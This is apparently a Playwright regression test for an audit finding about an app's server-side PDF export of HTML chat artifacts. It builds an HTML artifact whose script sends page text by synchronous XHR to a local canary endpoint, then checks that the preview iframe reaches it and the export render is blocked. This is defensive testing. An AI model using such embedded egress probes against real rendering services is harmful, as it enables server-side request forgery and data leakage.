import { test, expect, type Page } from "@playwright/test";
import fs from "node:fs";
import path from "node:path";
import { extractText, getDocumentProxy } from "unpdf";

/**
 * AUDIT FINDING 7 (2026-11-06) — the PDF export trust boundary, proven through
 * the feature's REAL entry point: an ```html artifact in the chat UI whose
 * "Export PDF" button posts the fence body verbatim to /api/documents/pdf, where
 * headless Chromium renders it.
 *
 * The contrast this test pins is the whole point of the repair:
 *   • PREVIEW (the browser's sandboxed iframe) may still fetch — finding 6
 *     deliberately left artifacts able to load remote resources, so the canary
 *     read from the frame must SUCCEED. That is also the anti-vacuity control:
 *     the canary host is live and reachable, so a clean export ledger means the
 *     wall worked, not that the target was down.
 *   • EXPORT (the server-side render of the same bytes) must reach NOTHING.
 *
 * Sequencing is load-bearing: the ledger is reset only AFTER the preview frame
 * has finished probing, so anything recorded afterwards can only have come from
 * the render. The probe fires once at parse time (synchronous XHR) — no timers,
 * no retries. Deterministic: the fence arrives over a mocked SSE stream, so this
 * run puts zero load on the shared inference backend.
 */

const ASSISTANT_DONE = '[data-testid="assistant-message"][data-state="complete"]';
const FIXTURE = "http://127.0.0.1:3210";
const DL_DIR = path.resolve("test-results/e2e-modality");

const ARTIFACT = [
  '<div id="r">export canary</div>',
  "<script>",
  "function line(t){var d=document.createElement('div');d.id='v';d.textContent=t;document.body.appendChild(d);}",
  // Synchronous on purpose: the answer is in the DOM before the parser ends, so
  // both the preview assertion and the printed PDF text are race-free.
  "try{var x=new XMLHttpRequest();x.open('GET','" + FIXTURE + "/egress/canary?d='+encodeURIComponent(document.getElementById('r').textContent),false);x.send();",
  "line('XHR:'+(x.responseText?'READ':'EMPTY'));}catch(e){line('XHR:BLOCKED');}",
  "<\/script>",
].join("\n");

async function mockStream(page: Page, content: string, decisionMode: string): Promise<void> {
  await page.route("**/api/chat", async (route) => {
    const frames: string[] = [];
    for (let i = 0; i < content.length; i += 96) {
      frames.push(`data: ${JSON.stringify({ choices: [{ delta: { content: content.slice(i, i + 96) } }] })}\n\n`);
    }
    frames.push("data: [DONE]\n\n");
    await route.fulfill({
      status: 200,
      headers: { "content-type": "text/event-stream", "x-decision-mode": decisionMode },
      body: frames.join(""),
    });
  });
}

async function ledger(): Promise<{ hits: string[]; secret: string }> {
  const res = await fetch(`${FIXTURE}/egress/ledger`, { cache: "no-store" });
  return res.json();
}

async function pdfText(buf: Buffer): Promise<string> {
  const doc = await getDocumentProxy(new Uint8Array(buf));
  try {
    const { text } = await extractText(doc, { mergePages: false });
    return (Array.isArray(text) ? text : [String(text)]).join("\n").trim();
  } finally {
    await (doc as { destroy?: () => void }).destroy?.();
  }
}

test("finding 7: exporting an html artifact as PDF cannot phone home from the render", async ({ page }) => {
  test.setTimeout(120_000);
  fs.mkdirSync(DL_DIR, { recursive: true });

  await fetch(`${FIXTURE}/egress/reset`, { method: "POST" });
  const baseline = await ledger();
  expect(baseline.hits, "the egress ledger was not empty at start").toEqual([]);

  await mockStream(page, "```html\n" + ARTIFACT + "\n```", "html_render");
  await page.goto("/");
  const box = page.locator("textarea").first();
  await box.click();
  await box.fill("html artifact that probes a local server");
  await box.press("Enter");
  await page.locator(ASSISTANT_DONE).first().waitFor({ timeout: 20_000 });

  const block = page.locator('[data-testid="html-artifact-block"]');
  await expect(block).toBeVisible();

  // 1. Preview side: the frame CAN read the canary (finding 6's deliberate
  //    boundary), which proves the target host is live and the export's clean
  //    ledger below is real protection rather than an unreachable fixture.
  const frame = block.locator("iframe").contentFrame();
  await expect(frame.locator("#v")).toHaveText("XHR:READ", { timeout: 15_000 });
  const previewHits = await ledger();
  expect(previewHits.hits.some((h) => h.includes("/egress/canary"))).toBe(true);

  // 2. From here on, only the server-side render can touch the fixture.
  await fetch(`${FIXTURE}/egress/reset`, { method: "POST" });
  expect((await ledger()).hits).toEqual([]);

  const [response, download] = await Promise.all([
    page.waitForResponse((r) => r.url().includes("/api/documents/pdf"), { timeout: 90_000 }),
    page.waitForEvent("download", { timeout: 90_000 }),
    block.getByRole("button", { name: "Export as PDF" }).click(),
  ]);
  expect(response.status()).toBe(200);

  // 3. The render reached NOTHING. The preview's read landed in the app's own
  //    browser; the export's identical script was refused on the server.
  const after = await ledger();
  expect(after.hits, `the export render reached the fixture: ${JSON.stringify(after.hits)}`).toEqual([]);

  // The guard reports what it refused (a count only, never URLs or contents).
  const blocked = response.headers()["x-pdf-blocked-requests"];
  expect(blocked, "the PDF response carries no blocked-request count").not.toBeUndefined();
  expect(Number(blocked)).toBeGreaterThanOrEqual(1);

  // 4. The download is a real PDF of the same artifact, and inside THAT render
  //    the identical probe reports BLOCKED with the secret nowhere in the file.
  const file = path.join(DL_DIR, "finding7-egress-export.pdf");
  await download.saveAs(file);
  const text = await pdfText(fs.readFileSync(file));
  expect(text).toContain("export canary");
  expect(text).toContain("XHR:BLOCKED");
  expect(text).not.toContain("XHR:READ");
  expect(text).not.toContain(after.secret);
});
